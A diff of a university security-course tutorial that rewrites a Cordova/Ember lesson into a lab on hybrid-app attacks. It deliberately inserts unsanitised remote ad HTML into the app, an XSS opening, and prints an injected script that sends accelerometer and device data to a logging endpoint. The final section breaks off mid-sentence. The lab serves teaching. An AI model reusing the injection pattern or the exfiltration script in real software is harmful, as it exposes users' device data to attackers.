@@ -7,50 +7,146 @@
 
 
 ### Introduction
-In this module you will go behind a simple 'Hello World' app and interact with some of the native device features that Cordova gives you access too. It assumes you have completed the basic setup, configuration, and installation of Cordova, Android, and Ember as the [1st tutorial](hybrid-app-tutorial.md) discussed. It also assumes you have completed the [previous tutorial](hybrid-app-tutorial-part2.md) 
+In this module you will explore the increased vulnerability surface a hybrid app has compared to its web app cousins. The tutorial assumes you have completed the basic setup, configuration, and installation of Cordova, Android, and Ember as the [1st tutorial](hybrid-app-tutorial.md) discussed. It also assumes you have completed the [previous tutorial](hybrid-app-tutorial-part2.md) 
 
 ### Getting Started
 Start by getting our development environment setup. For this tutorial, we will use the Android emulator we setup last time. If you want, you can replace the emulator portions with your actual Android device and use ADB.
 
 #### Starting the Android Emulator
+>! It is very important that you are on the UNO VPN for this lab.
 open a new shell (power shell or CMD if windows), navigate to your code repository, and launch the emulator.
 
 ```
 cd ./hybridapp/
 ember cdv run --platform=android --emulator
 ```
-#### Running the livereload ember cordova server
-Once the emulator is launched, you can start serving the live-reload ember server using the following command:
-
-```
-ember cdv:serve --platform=android --verbose
-```
-
-If all goes well you should see a terminal running ember (leave it running):
-
-![ember running](hybrid-app-tutorial-part2/ember-server-running.png)
 
 and then upon opening the app, the app running in the emulator:
 
-![ember running in emulator](hybrid-app-tutorial-part2/ember-server-running2.png)
+![ember running in emulator](hybrid-app-tutorial-part2/accelerometer-graph.gif)
+
+#### Not using live reload
+For this tutorial, we will remove live reload - so we can work with an external API properly. Open ```/ember-cordova/cordova/config.xml``` and remove the line:
+
+```XML
+    <allow-navigation href="*" />
+```
+
+#### New workflow
+To rebuild and re-deploy your app. Run the following:
+
+```bash
+ember cdv:build --platform android
+ember cdv run --platform=android --emulator
+```
+
+This will rebuild the app and redeploy the APK - freeing it from needing to talk to the ember live reload server. You should see the running app from before, e.g.:
+
+![ember running in emulator](hybrid-app-tutorial-part2/accelerometer-graph.gif)
 
 [Top](#table-of-contents)
 
-### Dev tool usage
+### Advert integration
+Conceptually, we will include code that will load advertisements when our app loads, and display them to the user. The ad server we've selected exposes an advert API endpoint at ```hybridapp.mlhale.com/api/adverts/```. This endpoint shows all available advertisements - allowing them to be consumed by a mobile app (or any other web app). A single advert is structured as follows:
 
-#### Android Tools
-Before we get started lets launch some dev tools. First and foremost, launch the Android emulator controls by clicking the '...' shown below. This will launch a panel of various controls that we can use to simulate GPS, accelerometer, and other types of data.
+id: &lt;a unique primary key&gt;
+name: &lt;an internal name that identifies who contributed the advert&gt;
+payload: &lt;the raw HTML to be injected into the consuming web app or mobile app&gt;
 
-![android-controls](hybrid-app-tutorial-part2/android-controls.png)
+Each consuming app must contain a div with id ```advert``` and the app must include javascript to insert the add payload into this div.
 
-This will launch a window that should resemble this:
+specifically, the ad server requires the following code be inserted into the &lt;body&gt; tag of apps that wish to use its ads.
 
-![android-controls](hybrid-app-tutorial-part2/android-controls2.png)
+```html
+<!--ad scripts-->
+    <script type="text/javascript">
+      var testvar= [];
+      $.ajax({
+          url: 'http://hybridapp.mlhale.com/api/adverts/8',
+          type: "GET",
+      }).then(function (data, status, request){
+        console.log("Successful ajax call: " + request.responseText);
+        testvar = [data, status, request];
+        $('#advert').append(data.advert.payload);
+      }).fail(function(request, status, error){
+        console.log("Ajax error: "+request.responseText);
+      });
+    </script>
+    {{content-for "body-footer"}}
+    <p>Word from our sponsors</p>
+    <div id="advert" style="width: 100%;">
 
-We will use this later to simulate some accelerometer activity.
+    </div>
+```
 
-#### Chrome Dev tools 
-This may be surprising to you, but the chrome dev tools we all know and love work with Android! Think about it, your app is really a fancy web app living in a native wrapper. Chrome is smart enough to talk to Android device browsers - so it can talk to Cordova Webviews too!
+This situation is a common pattern for ads integrated into mobile and web apps.
+
+#### Introducing a vulnerability
+The problem is, the ad server we selected has not been secured properly and has already been compromised. Specifically, it accepts arbitrary - potentially malicious - advert submissions from its partner ad networks. This means that the ads being loaded into the app could contain malicious code that attacks our hybrid app.
+
+That is exactly what we will demonstrate here.
+
+#### Integrate the ad server
+Lets return to the ad code and insert it into our app.
+
+open ```/app/index.html``` inside the body tag, at the bottom. When you are done, your code should look like the following (assuming your app is called 'hybridapp')
+```HTML
+<!--ad scripts-->
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hybridapp</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    {{content-for "head"}}
+
+    <link rel="stylesheet" href="{{rootURL}}assets/vendor.css">
+    <link rel="stylesheet" href="{{rootURL}}assets/hybridapp.css">
+
+    {{content-for "head-footer"}}
+  </head>
+  <body>
+    {{content-for "body"}}
+
+    <script src="{{rootURL}}assets/vendor.js"></script>
+    <script src="{{rootURL}}assets/hybridapp.js"></script>
+
+    <!--ad scripts-->
+    <script type="text/javascript">
+      var testvar= [];
+      $.ajax({
+          url: 'http://hybridapp.mlhale.com/api/adverts/7',
+          type: "GET",
+      }).then(function (data, status, request){
+        console.log("Successful ajax call: " + request.responseText);
+        testvar = [data, status, request];
+        $('#advert').append(data.advert.payload);
+      }).fail(function(request, status, error){
+        console.log("Ajax error: "+request.responseText);
+      });
+    </script>
+    {{content-for "body-footer"}}
+    <p>Word from our sponsors</p>
+    <div id="advert" style="width: 100%;">
+
+    </div>
+  </body>
+</html>
+```
+
+This code specifically loads the Ad content above the ember code and points to the adverts/7/ endpoint - pulling in and displaying whatever data is in the payload. 
+
+Rebuild your ember app and re-run it to see our new code in action.
+
+```bash
+ember cdv:build --platform android
+ember cdv run --platform=android --emulator
+```
+
+For you to see what is going on, open a chrome developer tab to inspect the app.
 
 To inspect our app, open a new chrome window and type the following:
 ```
@@ -63,252 +159,84 @@ You should see something like this:
 
 Clicking 'inspect' will give you a full visual + console toolset that you can use to interact directly with the running app.
 
-![Chrome inspect](hybrid-app-tutorial-part2/chrome-inspect2.png)
+![advert](hybrid-app-tutorial-part3/advert-integrated.png)
 
-Pretty neat!
+Notice that we see some stuff was loaded into the advert div - namely 'Advert text', 'Advert img:', and the google logo.
 
-[Top](#table-of-contents)
+![advert2](hybrid-app-tutorial-part3/advert-integrated2.png)
 
-### Working with your first Cordova Plugin
-Lets get started with really using Cordova. The beauty of the platform is that it exposed native libraries to webviews in native wrappers. Let's explore our first plugin. 
+If you look closely, you can see the problem with this ad server - and with blindly injecting arbitrary HTML into your app.
 
-#### Adding the plugin
-Stop the ember cdv:serve command running in the original shell you opened (ctrl + c), open up a new shell and navigate to your ember project.
+Look below the advert img src. Notice there is a ```script``` tag there. 
+Where did it come from???
 
-```bash
-cd ./hybridapp/
+Click it. 
+
+![advert2](hybrid-app-tutorial-part3/advert-integrated3.png)
+
+That's right it was injected into the app!
+
+### Exploring attacks
+It turns out attacks can do more than just popup alerts. They can also steal information and send it back to some malicious server for analysis.
+
+In ```/app/index.html``` switch your url to advert 9
+
+```javascript
+$.ajax({
+          url: 'http://hybridapp.mlhale.com/api/adverts/9',
 ```
 
-Now lets tell cordova to add a plugin to our app. In the new terminal type:
+Then rebuild and reload your app:
 
 ```bash
-ember cdv:plugin add cordova-plugin-device-motion
-```
-Once this completes, rebuild your app and send the apk to the emulator.
-
-```bash
+ember cdv:build --platform android
 ember cdv run --platform=android --emulator
 ```
 
-Now with the app running in the emulator, switch back to the first terminal and re-run the ember livereload server.
-```bash
-ember cdv:serve --platform=android --verbose
-```
+When the app loads you will see a popup telling you than an attack has succeeded (this alert is built into the attack code - usually attacks are silent).
+![advert2](hybrid-app-tutorial-part3/accelerometer-attack.png)
 
-[Top](#table-of-contents)
+What just happened is that the attack grabbed the current accelerometer data and sent it to a logging server (sitting on the same server as our ad server for conveinence). This logging server could be anything - and could reside anywhere. Now the attacker has your data! In case you are wondering this is the attack code injected into the app.
 
-### Accelerometer display component
-Lets create a new component that will be responsible for displaying accelerometer data as it comes in.
-```bash
-ember generate component accelerometer-display
-```
-
-open up and edit the ```/app/templates/application.hbs``` template to look like the following:
-
-> raw code below
-
-```hbs
-Demo Cordova Plugins For Days
-
-{{accelerometer-display currX=x currY=y}}
-
-```
-Now open the new component ```/app/templates/components/accelerometer-display.hbs``` and modify it to the following:
-
-```hbs
-Accelerometer X value: {{x}}<br>
-Accelerometer Y value: {{y}}<br>
-Accelerometer Z value: {{z}}<br>
-```
-
-Saving your code you should see:
-
-![Empty Template](hybrid-app-tutorial-part2/template-only.png)
-
-#### Making it actually work
-Now that we have some basic markup, we need to tell our ember component where to get its data from. This involves connecting the component to the cordova plugin data via the cordova API. Essentially we want our component to work as shown in the following diagram.
-
-![Component Architecture](hybrid-app-tutorial-part2/component-architecture.png)
-> The runloop is a function that will be responsible for invoking the Cordova API and getting and updating the current values of x, y, and z.
-
-To implement this, lets modify our component code in ```/app/components/accelerometer-display.js```
-
-> Raw code below
-
-```js
-import Ember from 'ember';
-
-export default Ember.Component.extend({
-  x: 0,
-  y: 0,
-  z: 0,
-  on: true,
-  startLogging: function(){
-    //begin logging accelerometer data once the component launches
-
-    var component = this;
-    this.updateAccelData(component)
-    
-  }.on('init'),
-  updateAccelData: function(component){
-    Ember.run.later(function(){
-      //wrapper to preserve binding satistfaction
-      try {
-        //invoke cordova accelerometer Plugin and get accelerometer data
-        navigator.accelerometer.getCurrentAcceleration(function (acceleration) {//success callback
-            console.log('acceleration setvars called');
-            component.set('x', acceleration.x);
-            component.set('y', acceleration.y);
-            component.set('z', acceleration.z);
-            console.log("accel vals: x: "+ acceleration.x+ " y: "+acceleration.y+" z: "+acceleration.z+" t: "+ Date.now());
-        }, function (error) {//error callback
-            console.log('error: ' + error);
+```HTML
+<script>
+    var result={'x':'','y':'','z':'','timestamp':''};
+    try {navigator.accelerometer.getCurrentAcceleration(function (acceleration) {//success callback
+        //console.log('acceleration setvars called');
+        result.x=acceleration.x;
+        result.y=acceleration.y;
+        result.z=acceleration.z;
+        result.timestamp=acceleration.timestamp;
+var formData = 'attack=9'+'&result='+JSON.stringify(result)+'&device_type='+navigator.userAgent+'&platform='+navigator.platform+'&platform_version='+navigator.vendor;
+        $.ajax({
+            url: 'http://hybridapp.mlhale.com/api/logitems/',
+            type: "POST",
+            data: formData,
+            contentType:"application/x-www-form-urlencoded"
+        }).then(function (data, status, request){
+            console.log("Successful ajax call: " + request.responseText);
+            alert('Attack Succeeded: '+request.responseText, 10000);
+        }).fail(function(request, status, error){
+            console.log("Ajax error: "+request.responseText);
+            alert('Attack Failed: '+request.responseText, 10000);
         });
-      }
-      catch(err){
-        console.log('error: '+err);
-      }
-      if(component.get('on')){
-        //keep running
-        component.updateAccelData(component); //recurse
-      }
-
-    }, 100);//run ever 100ms
-  }
-});
+    }, function (error) {//error callback
+        //do some error handling
+    });}
+    catch(err){
+        alert('Attack Failed: '+'Cordova failed: probably not running on a mobile device.', 10000);
+    }
+</script>
 ```
 
-There is a lot here, so lets unpack it. First, lines 4-7, setup some basic variables for storing the x, y, and z parameters. The 'on' variable is a boolean that indicates when to stop the run loop. Lines 8-14 initialize the run loop, but waiting until the component has rendered (i.e. 'on init'). The meat of the componet is in lines 15-39. This updateAccelData method runs every 100ms and invokes the navigator.accelerometer method as outlined in the [cordova API](https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-device-motion/index.html#navigatoraccelerometergetcurrentacceleration): (please review this method before proceeding). Sepcifically, the function invokes the accelerometer and then stores x, y, and z back into the component. On lines 33-36, the function will decides to 'loop' again if ```on``` is true. 
+Here is a screenshot of the logs generate on my logging server
 
-#### Testing it out
-Once you've saved the new code, try playing around with it using the Android controls. I started by 'sliding down' and turning off rotate display functionality on the emulated phone.
-
-![Turn off rotate](hybrid-app-tutorial-part2/turn-off-rotate.png)
-
-With rotate display off, I opened the Android emulator tools and started rotating the phone to get some readings.
-
-![Testing accelerometer](hybrid-app-tutorial-part2/android-rotate-capture.gif)
+![advert2](hybrid-app-tutorial-part3/accelerometer-attack2.png)
 
 [Top](#table-of-contents)
 
-### Extending the app
-Just for kicks, lets extend this app and add a time-series chart from [http://opensource.addepar.com/ember-charts/#/time-series](http://opensource.addepar.com/ember-charts/#/time-series). We can store accelerometer data into an array of previous points and then graph them.
-
-```bash
-ember install ember-charts
-```
-
-#### Template Code
-First open your template code ./app/templates/components/accelerometer-display.js
-edit it to the following to add our chart component in. 
-
-```hbs
-Accelerometer X value: {{x}}<br>
-Accelerometer Y value: {{y}}<br>
-Accelerometer Z value: {{z}}<br>
-
-{{time-series-chart lineData=accelHistory}}
-```
-This tells the chart library that our lineData is in a variable called 'accelHistory'. It doesn't exist yet, but we are about to create it.
-
-#### Component Code
-Now open your component code ./app/components/accelerometer-display.js and modify it to the following, adding an array of data points and code to update the array as new points come in.
-
-> Raw code below
-
-```js
-import Ember from 'ember';
-
-export default Ember.Component.extend({
-  x: 0,
-  y: 0,
-  z: 0,
-  accelHistory: [],
-  on: true,
-  startLogging: function(){
-    //begin logging accelerometer data once the component launches
-
-    var component = this;
-    this.updateAccelData(component);
-    
-  }.on('init'),
-  updateAccelData: function(component){
-    Ember.run.later(function(){
-      //wrapper to preserve binding satistfaction
-      try {
-        //invoke cordova accelerometer Plugin and get accelerometer data
-        navigator.accelerometer.getCurrentAcceleration(function (acceleration) {//success callback
-            //console.log('acceleration setvars called');
-            component.set('x', acceleration.x);
-            component.set('y', acceleration.y);
-            component.set('z', acceleration.z);
-
-            //update history, maintain 50 points max
-            var history=component.get('accelHistory');
-            if(history.length === 150){
-              history.shiftObject();//shift an x off
-              history.shiftObject();//shift a y off
-              history.shiftObject();//shift a z off
-            }
-            var t = Date.now();
-            var newXPoint = {time: t, label: 'x', value: acceleration.x};
-            var newYPoint = {time: t, label: 'y', value: acceleration.y};
-            var newZPoint = {time: t, label: 'z', value: acceleration.z};
-            history.addObjects([newXPoint, newYPoint, newZPoint]);
-            //console.log("accel vals: x: "+ acceleration.x+ " y: "+acceleration.y+" z: "+acceleration.z+" t: "+ Date.now());
-        }, function (error) {//error callback
-            console.log('error: ' + error);
-        });
-      }
-      catch(err){
-        console.log('error: '+err);
-      }
-      if(component.get('on')){
-        //keep running
-        component.updateAccelData(component); //recurse
-      }
-
-    }, 100);//run ever 100ms
-  }
-});
-
-```
-
-Now instead of just overwriting X, Y, and Z when the next point comes in, we are pushing those values into an array of 50 time points. When the array gets full, we shift off the first three points (x, y, z for a single time t) and add on the new ones. Pretty nifty. 
-
-#### Time to test it out
-I've added another dandy gif of the graph. Test it out yourself!
-
-![With graph](hybrid-app-tutorial-part2/accelerometer-graph.gif)
-
-[Top](#table-of-contents)
-
-### Integrating other Cordova Plugins
-You can apply the same logic used for Accelerometer to other Cordova Plugins. The typical ember-cordova workflow is
-
-1. Install the cordova plugin using ember cdv:plugin add <name of plugin>
-1. Create an ember component to handle the data and manage the interaction with the plugin
-1. Add the component somewhere in your App's template code
-1. Invoke the Cordova API (Typically ```navigator.<name of plugin>```) in your component code according to the documentation and update the component variables tracking the data accordingly.
-
-#### Try it
-Work with someone else in the class and add a feature to your app to use another component. Pick from one of the components listed in the [cordova docs](https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-battery-status/index.html)
-
-When you've integrated it, fork this repo and edit hybrid-app-tutorial-part2.md to include your directions (below in this section) and make a pull request to add in your own directions to use other features. This way everyone can benefit!
-
-### Student Contributions
-The following plugin module directions are submitted by previous students in the course. 
-
-#### Authors 
-(your names go here)
-#### Plugin Name (which plugin did you look at?)
-(Provide a link to the plugin and briefly describe it)
-#### Usage
-(your instructions go here)
-
-[Top](#table-of-contents)
-
-### Next time we explore vulnerabilities and exploitations in hybrid apps.
+### Write your own attack
+You should be able to make POST requests (JSON or url encoded) to hybridapp.mlhale.com/api/adverts/ to store yo
 
 #### License
 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">CYBER8480</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="http://faculty.ist.unomaha.edu/mlhale" property="cc:attributionName" rel="cc:attributionURL">Matt Hale</a> work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
